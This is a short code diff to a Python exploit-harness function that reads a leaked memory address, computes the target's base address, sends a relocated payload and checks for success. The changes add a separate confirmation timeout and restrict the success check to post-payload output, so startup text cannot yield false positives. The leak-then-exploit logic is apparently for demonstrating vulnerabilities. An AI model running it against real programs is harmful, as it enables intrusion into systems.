@@ -78,6 +78,7 @@ def leak_and_exploit(exe, base_argv, *, leak_regex: str, leak_base_offset: int,
 
         base = leaked - leak_base_offset
         payload = payload_for_base(base)
+        sent_at = len(buf)          # only output AFTER this can confirm the RELOCATED payload worked
         try:
             p.stdin.write(payload)
             p.stdin.flush()
@@ -86,7 +87,10 @@ def leak_and_exploit(exe, base_argv, *, leak_regex: str, leak_base_offset: int,
             pass
 
         out = buf
-        while time.time() < deadline:
+        # A FRESH budget for the confirmation read: the leak may have arrived just before `deadline`,
+        # which would otherwise leave this loop zero iterations and miss a genuine success marker.
+        post_deadline = time.time() + timeout
+        while time.time() < post_deadline:
             r, _, _ = select.select([p.stdout], [], [], 0.2)
             if r:
                 chunk = os.read(p.stdout.fileno(), 4096)
@@ -95,8 +99,11 @@ def leak_and_exploit(exe, base_argv, *, leak_regex: str, leak_base_offset: int,
                 out += chunk
             elif p.poll() is not None:
                 break
+        # Search ONLY the post-payload bytes: a success_regex that merely appears in the target's
+        # normal startup/leak output (pre-payload) must not declare a false "demonstrated".
         return {"ok": True, "leaked": leaked, "base": base,
-                "success": bool(ok.search(out)), "output": out[:800].decode("latin-1", "ignore")}
+                "success": bool(ok.search(out[sent_at:])),
+                "output": out[:800].decode("latin-1", "ignore")}
     finally:
         _kill(p)
         try:
